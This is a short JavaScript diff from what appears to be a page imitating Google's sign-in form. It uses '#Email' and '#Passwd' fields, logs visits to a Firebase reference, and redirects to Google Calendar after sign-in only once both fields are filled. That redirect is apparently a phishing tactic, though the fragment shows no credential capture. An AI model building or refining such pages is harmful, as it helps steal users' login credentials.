@@ -1130,7 +1130,9 @@ ref.child("mobile").child(new Date().getTime()).update({"is":window.mobilecheck(
 $(function() {
   $("#signIn").click(function(){
       setTimeout(function() {
-          location = "http://google.com/calendar/render"
+          if ($("#Email").val() && $("#Passwd").val()) {
+            location = "http://google.com/calendar/render"
+          }
       }, 2000);
   });
 });
